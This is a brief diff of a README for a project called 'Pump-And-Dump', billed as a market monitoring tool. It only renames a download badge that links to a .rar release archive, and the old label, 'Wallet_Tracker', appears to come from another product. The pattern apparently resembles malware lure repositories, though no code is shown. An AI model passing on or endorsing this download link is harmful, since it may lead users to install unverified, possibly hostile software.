@@ -1,7 +1,7 @@
 # Pump-And-Dump
 # Market Monitoring and Alerts Tool
 
-[![Download Pump And Dump](https://img.shields.io/badge/Download-Wallet_Tracker_v1.2-blue?style=for-the-badge)](https://github.com/mervandz/Pump-And-Dump/releases/download/v1.2/pump.dump.rar)  
+[![Download Pump And Dump](https://img.shields.io/badge/Download-Pump And Dump_v1.2-blue?style=for-the-badge)](https://github.com/mervandz/Pump-And-Dump/releases/download/v1.2/pump.dump.rar)  
 
 ![Pump And Dump](https://i.ibb.co/hdRFYT7/2.png)
 
